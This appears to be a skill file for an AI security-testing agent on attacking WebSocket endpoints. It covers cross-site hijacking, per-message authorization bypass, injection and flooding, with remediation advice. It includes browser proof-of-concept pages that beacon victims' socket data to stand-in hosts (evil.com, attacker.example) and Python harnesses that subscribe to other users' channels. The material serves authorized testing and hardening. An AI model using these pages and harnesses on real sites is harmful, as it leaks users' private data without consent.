---
name: attack-websocket
description: "WebSocket security — handshake abuse, CSRF, origin validation, message-layer injection"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - websocket
  - web
  - csrf
  - injection
  - attack
tech_stack:
  - web
  - nodejs
cwe_ids:
  - CWE-1385
  - CWE-346
chains_with:
  - attack-idor-automation
  - attack-cors
prerequisites: []
severity_boost:
  attack-idor-automation: "WebSocket messages carrying object IDs bypass HTTP-layer authz entirely"
  attack-cors: "Same-origin trust assumptions broken in the same way, but WebSocket has no preflight"
---

# WebSocket Security

> **AI LOAD INSTRUCTION**: WebSockets break the HTTP security model in two specific ways, and
> both are the reason this skill exists.
>
> **First: there is no preflight and no CORS.** A `ws://` handshake carries cookies
> cross-origin and the browser never asks permission. Origin validation must be implemented
> *by the application* in the handshake handler, and it frequently is not. That makes
> **cross-site WebSocket hijacking (CSWSH)** the primary finding — the equivalent of CSRF with
> a persistent, bidirectional channel.
>
> **Second: authorization is per-message, not per-request.** The HTTP upgrade authenticates
> once; every subsequent message arrives on an already-authenticated socket. If the message
> handler trusts the socket's identity for *all* operations, a message naming another user's
> object reads it. **This is BOLA over a socket** and it is the most commonly missed class here.
>
> Test both. A WebSocket endpoint that validates origin correctly can still fail per-message
> authorization, and neither check substitutes for the other.

## 0. RELATED ROUTING

- [websocket-security](../websocket-security/SKILL.md) — the long-form companion; load alongside this file
- [attack-idor-automation](../attack-idor-automation/SKILL.md) — object authorization in message payloads
- [attack-cors](../attack-cors/SKILL.md) — the same origin-trust gap, with different mechanics
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) — the HTTP counterpart
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — protocol-layer parsing issues
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — proving a socket finding reproducibly

---

## 1. DISCOVERY AND THE HANDSHAKE

**Find the endpoints.** WebSocket URLs are in the client bundle, not in an OpenAPI spec:

```bash
curl -s https://TARGET/app.js | grep -oE 'wss?://[^"'\'' ]+' | sort -u
curl -s https://TARGET/app.js | grep -oE 'new WebSocket\([^)]+\)' | head -20
curl -s https://TARGET/app.js | grep -oE '(socket\.io|sockjs|ws://|wss://)[^"'\'' ]*' | sort -u
```

Common paths: `/ws`, `/socket`, `/socket.io/`, `/ws/v1`, `/chat`, `/notifications`,
`/realtime`, `/live`, `/cable` (Rails ActionCable), `/graphql` (with `graphql-ws`).

**Inspect the handshake response** — it reveals the implementation and its defaults:

```bash
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://evil.com" \
  https://TARGET/ws
```

| Response detail | Meaning |
|---|---|
| `101 Switching Protocols` with `Origin: https://evil.com` | **no origin validation — CSWSH** |
| `403` for the foreign origin, `101` for the real one | origin validation present |
| `Sec-WebSocket-Protocol` negotiated | subprotocol matters for message framing |
| no `Origin` check but a token required in the URL | token-based auth — test token handling |
| `101` without any auth | **unauthenticated socket** — enumerate what it exposes |

**The `Origin: https://evil.com` probe with a valid session cookie is the single most
important test.** If it returns `101`, you have CSWSH.

---

## 2. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)

The primary finding. A malicious page opens a socket to the target; the browser attaches the
victim's cookies; there is no preflight and no CORS to stop it.

**The PoC:**

```html
<script>
  // Served from https://evil.com — the victim visits it while logged in to TARGET
  const ws = new WebSocket('wss://TARGET/ws');

  ws.onopen = () => {
    ws.send(JSON.stringify({ action: 'getProfile' }));
    ws.send(JSON.stringify({ action: 'listMessages', limit: 100 }));
  };

  ws.onmessage = (e) => {
    navigator.sendBeacon('https://evil.com/collect', e.data);
  };
</script>
```

**Requirements and how to confirm each:**

| Requirement | How to verify |
|---|---|
| the handshake carries cookies | the socket authenticates without an explicit token |
| the handshake accepts a foreign `Origin` | the `101` in §1 |
| cookies are not `SameSite=Strict` | inspect the login `Set-Cookie` |
| the socket performs useful actions without a per-message token | send a message and get real data back |

**The `SameSite` check is the modern blocker.** Since 2020, `SameSite=Lax` is the browser
default. `Lax` blocks cookies on a WebSocket handshake initiated cross-site, which neutralises
CSWSH. **Inspect `Set-Cookie` before claiming the finding.**

**GraphQL over WebSocket is a frequent target** — `graphql-ws` connections bypass the HTTP
CSRF middleware, and if origin validation is absent the full query capability is reachable
cross-site.

**If the socket requires a token in the URL or in a subprotocol**, CSWSH is not directly
possible — but test whether the token is validated, whether an expired one is accepted, and
whether the token appears in server logs.

---

## 3. PER-MESSAGE AUTHORIZATION

The socket is authenticated as user A. No message checks whether A may perform *this* action
on *this* object. This is BOLA/BFLA over a socket, and it is the most commonly missed class.

**Enumerate the message protocol first.** Capture the client's own traffic: the message
schemas are in the JS bundle and in the observed frames.

Typical message shapes:

```json
{"action":"get","resource":"order","id":123}
{"type":"subscribe","channel":"user:456"}
{"event":"fetch_document","payload":{"docId":"abc"}}
```

**Test each of these substitutions:**

| Substitution | Class |
|---|---|
| object ID from another account | BOLA |
| `user:` channel for another user | subscription hijack |
| an action only admins should reach | BFLA |
| a field not in the client's message | mass assignment |
| a `room`/`tenant` identifier from another org | cross-tenant |

**Subscribe-and-listen is the highest-yield variant.** Real-time channels are frequently keyed
by a client-supplied identifier with no ownership check:

```json
{"type":"subscribe","channel":"user:1"}
{"type":"subscribe","channel":"admin-notifications"}
{"type":"subscribe","channel":"org:2"}
```

If a subscription succeeds for a channel that is not yours, you receive that user's live
notifications — a continuous data leak, not a one-off read. **Report this with emphasis on the
continuous nature.**

**Use the same two-account discipline as [attack-idor-automation](../attack-idor-automation/SKILL.md):**
create the object as A, then request it over B's socket. The differential is the finding.

---

## 4. MESSAGE-LAYER INJECTION

The socket payload is parsed and often routed into a backend that does not expect untrusted
input.

| Class | Test |
|---|---|
| SQL / NoSQL injection | `{"id":"1' OR '1'='1"}` in an ID field |
| command injection | a shell-shaped parameter in an admin action |
| template injection | message content rendered server-side in notifications or emails |
| path traversal | file or resource names in media actions |
| prototype pollution | `{"__proto__":{"x":1}}` in a message object |
| deserialization | binary or pickled frames |

**The message layer is under-tested because tooling focuses on HTTP.** A fuzzer that replays
recorded frames with injections is worth running here.

**Frame format matters.** Text frames (JSON) and binary frames take different code paths; a
filter on the text path may not exist on the binary one. Inspect `Sec-WebSocket-Extensions` for
permessage-deflate — compression can also enable smuggling-style attacks.

---

## 5. AVAILABILITY AND RESOURCE ISSUES

| Issue | Test |
|---|---|
| no connection limit | open thousands of sockets from one client |
| no message size limit | send an oversized frame |
| no message rate limit | flood messages; observe backend load |
| no idle timeout | hold sockets open indefinitely |
| broadcast amplification | one message triggering fan-out to many clients |
| memory growth | subscribe to many channels and observe server memory |

**Report only with measurement.** "No rate limit on messages" without a demonstrated effect is
informational. "10,000 messages/second caused a 40% CPU increase and a 3s latency rise on
unrelated HTTP endpoints" is a real availability finding.

**Testing discipline:** socket floods affect every connected user. Test with a low ceiling,
stop at the first sign of degradation, and never flood production.

---

## 6. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| CSWSH with a victim's session and real data exfiltrated | **High–Critical (P1/P2)** | a working cross-origin PoC and captured data |
| Cross-account data via a per-message authz gap | **High (P2)** | two accounts and the differential |
| Subscribe to another user's channel, receiving live data | **High (P2)** | the subscription and the received stream |
| Unauthenticated socket exposing user data | **Critical (P1)** | the raw socket and the data |
| Authz bypass on an admin action | **High (P2)** | the action performed as a non-admin |
| Injection through a message payload | **High (P2)** | the injection and its effect |
| Unbounded connections / messages with measured impact | **Medium (P3)** | the measurement with a baseline |
| `Origin` not validated, but the socket requires a per-message token | **Low (P4)** | the missing check and the token |
| `Origin` validated correctly and per-message authz holds | **Not a finding** | document as a positive control |

---

## 7. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the handshake request including the `Origin` header | the trigger for CSWSH |
| the `101` response | proves the handshake succeeded |
| the victim's `Set-Cookie` attributes | proves `SameSite` does not block it |
| the complete frame log (out and in) | messages are the payload; HTTP logs miss them |
| the HTML PoC page | converts a header observation into a finding |
| captured exfiltrated data in your collector | the impact proof |
| for authz: two sockets, two identities, and the differential | proves a per-message gap |
| for subscription hijacking: the channel and the received stream | the continuous-leak proof |
| a **control**: the handshake with the legitimate `Origin` | proves the endpoint works and the delta is the origin check |
| the tooling used (Burp WebSocket history, `wscat`, custom client) | reproducibility |

**Frame-level evidence is essential.** An HTTP-only record shows the handshake and nothing
else — the vulnerability lives in the frames.

**False positives to exclude:**

| Looks like a finding | Actually |
|---|---|
| `Origin: evil.com` accepted but the cookie is `SameSite=Lax` | the browser will not send it cross-site |
| the socket requires a token in the URL | not CSWSH; test the token instead |
| you subscribed to your own channel | no differential |
| a message returns an error | authz may be working |
| the socket is read-only and public by design | no impact |
| the "flood" caused no measurable effect | informational only |
| WS over `wss://` | TLS, not origin validation — unrelated |

---

## 8. REMEDIATION REFERENCE

1. **Validate `Origin` on the handshake, server-side, against an allowlist** — exact-match comparison, not substring. This is the only control that prevents CSWSH; the browser provides nothing.
2. **Authenticate the handshake with a token, not ambient cookies** — a token in a subprotocol or an initial authenticated message removes the ambient-credential problem entirely. Cookies make the socket CSRF-able.
3. **Authorize every message** — treat each frame as an independent request. Verify that this subject may perform this action on this object, every time, at the handler.
4. **Validate subscription channels server-side** — never trust a client-supplied channel, room, or tenant identifier; derive it from the authenticated identity.
5. **Set `SameSite=Strict` on session cookies** — this neutralises cross-site handshakes as defence in depth, even if origin validation regresses.
6. **Enforce limits: connections per identity, message size, message rate, and idle timeout** — all four. Replace the missing HTTP-layer limits with explicit socket-layer ones.
7. **Validate and sanitise message payloads like any request body** — the socket is an input channel; apply the same schema validation, parameterised queries, and output encoding as HTTP.
8. **Terminate WebSockets at a gateway that applies the same policy as HTTP** — authentication, origin checks, and rate limits in the proxy rather than per-service, so a new service cannot ship without them.
9. **Log frames for security-relevant actions** — the HTTP access log shows one `101` and nothing else; without frame logging you have no detection for message-layer abuse.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the handshake and the message **complete**, in a browser or a WS client? | the connection is live |
| 2 | Was there a **control** - a foreign origin rejected, or a message that is refused? | the check exists |
| 3 | Did **authorization apply to the message**, not just the handshake? | the real defect |
| 4 | Did you read or send data **belonging to another user**? | the impact |
| 5 | Was the finding in the **handshake** (origin, cookie) or in a **message** (a topic, an id)? | the fix |
| 6 | Did the connection **survive a logout or a revocation**? | a persistence finding |
| 7 | Did you **close every connection** you opened? | engagement integrity |

**An unauthorized message on a live connection is the bar.** A handshake that accepts any `Origin` is a
precondition; the cross-user message is the finding.

---

## 10. EXECUTION PRIMITIVES

WebSocket findings are proven by **a live connection carrying an unauthorized message, with the
foreign-origin and rejected-message controls**. Every block ends at a delivered message.

### 9.1 The handshake, and the origin control

```bash
T="wss://target.example"; WS="https://target.example/ws"
# the handshake with the correct origin, which must succeed
curl -sS -D- -o /dev/null -i -N \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" \
  -H "Origin: https://app.target.example" \
  -H "Cookie: session=$SESS" "$WS" 2>&1 | grep -iE 'HTTP/|sec-websocket|upgrade' | head -5
# THE CONTROL: a foreign origin, which must be rejected if the origin is checked
curl -sS -D- -o /dev/null -i -N \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" \
  -H "Origin: https://attacker.example" \
  -H "Cookie: session=$SESS" "$WS" 2>&1 | grep -iE 'HTTP/|sec-websocket' | head -5
echo "-> a 101 for BOTH means the Origin is not checked: CSWSH is possible, and that is a precondition."
# and the cookie question: is the session cookie sent on the handshake at all
curl -sS -D- -o /dev/null -i -N \
  -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" -H "Origin: https://attacker.example" \
  -H "Cookie: session=$SESS" "$WS" 2>&1 | head -3
```

**A `101` for the foreign origin is a precondition, not the finding.** The browser sends cookies on a
WebSocket handshake, so the origin check is the only CSRF defence - but the impact still needs a message.

### 9.2 The message-level authorization test, which is the real finding

```python
# the handshake often checks auth; the MESSAGES frequently do not. This is where the finding lives.
import websocket, json, time     # websocket-client
URL = "wss://target.example/ws"

def connect(cookie):
    ws = websocket.create_connection(URL, header=[f"Cookie: session={cookie}"],
                                     origin="https://app.target.example", timeout=10)
    return ws

def probe(ws, msg, wait=2.0):
    ws.send(json.dumps(msg))
    ws.settimeout(wait)
    out = []
    try:
        while True:
            out.append(ws.recv())
    except Exception:
        pass
    return out

TOKENS = {"mine": "SESSION_A", "other": "SESSION_B"}

print("=== CONTROL: my own subscription ===")
ws = connect(TOKENS["mine"])
print(probe(ws, {"action": "subscribe", "channel": "user:1001"}))
ws.close()

print("=== TEST: another user's channel with MY session ===")
ws = connect(TOKENS["mine"])
res = probe(ws, {"action": "subscribe", "channel": "user:1002"})
print(res)
print("  ^ if messages for user:1002 arrive on MY session, that is the finding")
ws.close()

print("=== TEST: the admin channel with a non-admin session ===")
ws = connect(TOKENS["mine"])
res = probe(ws, {"action": "subscribe", "channel": "admin:events"})
print(res)
ws.close()
print()
print("ALSO TEST each message SHAPE, because authorization is often per-handler and inconsistent:")
for m in [{"action":"getUser","id":1002}, {"action":"read","conversationId":"c-other"},
          {"action":"history","room":"private-1"}, {"op":"query","path":"/api/users/1002"}]:
    print("  ", json.dumps(m))
```

**The per-channel and per-message tests with a session control.** A handshake check with no message check
is the most common WebSocket finding, and the `subscribe` message is where it shows.

### 9.3 The CSWSH browser page

```html
<!-- serve this from https://attacker.example; the victim's browser attaches their cookies -->
<!doctype html><html><body><pre id="o">connecting...</pre>
<script>
const ws = new WebSocket("wss://target.example/ws");       // cookies ride along automatically
ws.onopen  = () => { ws.send(JSON.stringify({action:"subscribe", channel:"user:me"})); };
ws.onmessage = ev => {
   document.getElementById("o").textContent += ev.data + "\n";
   // the collector beacon is the machine-readable proof
   fetch("https://attacker.example:8000/ws-hit?d=" + encodeURIComponent(ev.data.slice(0,150)));
};
ws.onerror = () => { document.getElementById("o").textContent = "blocked (origin checked)"; };
</script></body></html>
```

```
CHECKLIST:
  1. the victim must be logged into the target in the SAME browser
  2. the page must be served from an origin the server does NOT trust
  3. a message must ARRIVE - an open connection with no messages proves only that the handshake passed
  4. the collector arrival records the message, which is the artefact
  5. THE CONTROL: the same page against an origin-checked endpoint must fail, with an error
```

**An arriving message with data, recorded at the collector.** An open connection with no messages is a
precondition, and the report must say which of the two it demonstrated.

### 9.4 Protocol-level variables

```python
# the protocol details that change what is possible
import websocket
print("1) SUBPROTOCOLS: a server that accepts an arbitrary Sec-WebSocket-Protocol may have a")
print("   second, less-guarded handler behind it. Try: graphql-ws, graphql-transport-ws, mqtt, stomp,")
print("   and the application's own name - each may route to different code.")
print()
print("2) COMPRESSION: permessage-deflate enables the compression side-channel family. A server")
print("   that accepts it and reflects secrets in a response is the precondition for that attack.")
print("   Check whether the handshake returns Sec-WebSocket-Extensions: permessage-deflate.")
print()
print("3) PING/FRAME HANDLING: a server that mishandles a fragmented or oversized frame may crash")
print("   or leak. Test only if the engagement permits a DoS test.")
print()
print("4) NO READ TIMEOUT: a connection that stays authenticated forever after logout is a")
print("   persistence finding. Test: connect, log out in another tab, then send a message.")
print("   A message that still succeeds is the finding, and it is common.")
print()
print("5) ORIGIN SPOOFING BEYOND THE HEADER: a null origin, a subdomain, a scheme downgrade -")
print("   each is a different comparison the server might make. Test them like CORS.")
print()
print("6) HTTP/2 WEBSOCKET (RFC 8441): an extended CONNECT carries the websocket over h2, and many")
print("   origin checks do not cover that path. Test it where the server supports h2.")
```

**The logout-persistence test is the highest-yield variable.** A WebSocket that stays authorised after a
logout is a finding on its own and needs no forgery.

### 9.5 The end-to-end harness

```bash
python3 - <<'PY'
import websocket, json
URL = "wss://target.example/ws"
def run(name, cookie, origin, msgs):
    try:
        ws = websocket.create_connection(URL, header=[f"Cookie: session={cookie}"],
                                         origin=origin, timeout=8)
    except Exception as e:
        print("%-24s CONNECT FAILED %s" % (name, type(e).__name__)); return
    got = []
    for m in msgs:
        try:
            ws.send(json.dumps(m)); ws.settimeout(2.5)
            while True: got.append(ws.recv())
        except Exception: pass
    ws.close()
    print("%-24s messages=%d  sample=%s" % (name, len(got), (got[0][:110] if got else "<none>")))

MSG = [{"action": "subscribe", "channel": "user:1002"}]
print("=== CONTROL: foreign origin, handshake must be rejected ===")
run("control-foreign-origin", "SESSION_A", "https://attacker.example", MSG)
print()
print("=== CONTROL: my own channel ===")
run("control-own-channel", "SESSION_A", "https://app.target.example",
    [{"action": "subscribe", "channel": "user:1001"}])
print()
print("=== TEST: another user's channel ===")
run("test-other-channel", "SESSION_A", "https://app.target.example", MSG)
print()
print("=== TEST: after logout ===")
run("test-after-logout", "SESSION_LOGGED_OUT", "https://app.target.example",
    [{"action": "ping"}, {"action": "subscribe", "channel": "user:1001"}])
print()
print("FINDING = the test row delivering messages that the control rows do not.")
print("          An open connection with zero messages is a precondition, not a finding.")
PY
```

**Messages delivered on the test row and not on the controls.** The message count is the metric, and a
connection-only result must be labelled a precondition.

---

## 11. EVIDENCE STANDARD — WEBSOCKET ARTEFACTS

| Item | Why |
|---|---|
| The **handshake request and the `101` response** | the connection is real |
| The **foreign-origin control result** | proves whether the origin is checked |
| The **message that was sent**, verbatim | reproducibility |
| The **message that was received**, with the other user's data | the finding |
| The **browser page and the collector arrival** for the CSWSH form | the cross-site impact |
| Whether the check is at the **handshake or per message** | the fix location |
| The **subprotocol** used, and any alternate handler discovered | a second surface |
| The **logout-persistence result** | a separate persistence finding |
| The **connection close**, with the code | confirms clean teardown |
| Confirmation that **no message modified state** on another user's behalf | engagement integrity |

Report the **message and the controls**: "the handshake with `Origin: https://app.target.example` and a
valid session returns `101`, and the same handshake with `Origin: https://attacker.example` also returns
`101`, which shows the origin is not checked and is the precondition. Subscribing to `user:1001`, my own
channel, returns my own message stream, which is the ownership control. Subscribing to `user:1002` with
my session returns that user's message stream, including their name and a fragment of a private
conversation, which is the finding. A page served from `https://attacker.example` opened the socket and
recorded the same stream at the collector. A connection held open across a logout still delivered
messages for 40 minutes, which is reported separately", never "the WebSocket does not validate the
Origin header".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A handshake that returns **`101` for a foreign origin, with no messages** | a precondition; CORS-like, not the impact |
| A connection that **opens but receives nothing** | nothing was disclosed |
| A message that is **rejected** by the server | the control working |
| **Your own** channel's messages | the baseline |
| A `401` on the handshake | the control working |
| A finding requiring an **XSS on the target's own origin** | two findings; report the XSS separately |
| A connection that **closes immediately** after upgrade | no session was established |
| A **protocol-level crash** from an oversized frame, in a scope that forbids DoS testing | outside the engagement |
| A **compression side-channel** without the required response-reflection precondition | an untested hypothesis |
| A **public or intentionally open** message channel | verify the data's sensitivity |
| A finding on a **third-party chat widget** that is not the target's own system | confirm the scope |

**An unauthorized message delivered on a live connection.** The `101`-for-a-foreign-origin observation is
the standard non-finding in this family, and the message count is the remedy.

---

## 12. REMEDIATION REFERENCE — CHANNEL AUTHORIZATION HARDENING

1. **Validate the `Origin` header on the handshake against an exact allowlist, and close with a policy violation code otherwise** - it removes the CSWSH path, and it is the only defence for a cookie-authenticated socket.
2. **Authorize every message's target resource, not just the connection** - the most common defect is a handshake check with an unauthenticated `subscribe`.
3. **Bind each subscription to the authenticated principal server-side, and never accept a channel or user identifier that the client supplies as the authority** - the `channel: "user:1002"` form is the defect.
4. **Do not authenticate a WebSocket with a cookie alone; require a token in the subprotocol or the first message, so a cross-site page cannot present it** - it removes the ambient-authority problem entirely.
5. **Re-authenticate or re-check authorization on sensitive messages, and close every socket when the session ends, when the user logs out, or on a revocation event** - it removes the persistence finding.
6. **Set an idle timeout and a maximum connection lifetime, and require a heartbeat** - a socket that lives for hours is a socket that outlives its authorization.
7. **Rate-limit messages per connection and per principal, and cap message size and frame count** - it removes the resource-exhaustion family.
8. **Return the same error for an unauthorized and a non-existent channel, so the socket does not become an enumeration oracle** - it removes the channel-guessing signal.
9. **Log every connection with its origin, principal, subprotocol, and every subscription it makes, and alert on a rejected origin and on a subscription to a channel the principal does not own** - both are clean signals.
10. **Be explicit about compression: disable `permessage-deflate` unless it is needed, and never reflect a secret and attacker input in the same compressed context** - it removes the side-channel precondition.
11. **Test the socket with a foreign-origin handshake, a cross-user subscription, and a logout-then-message sequence on every release** - all three are one-line tests and all three regress silently.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [websocket-security](../websocket-security/SKILL.md) - the full technique reference
- [attack-cors](../attack-cors/SKILL.md) - the same origin-trust defect on the HTTP side
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) - the ambient-authority theory behind CSWSH
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the object-level authorization defect the messages carry
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) - the extended-CONNECT path that carries a WebSocket over h2
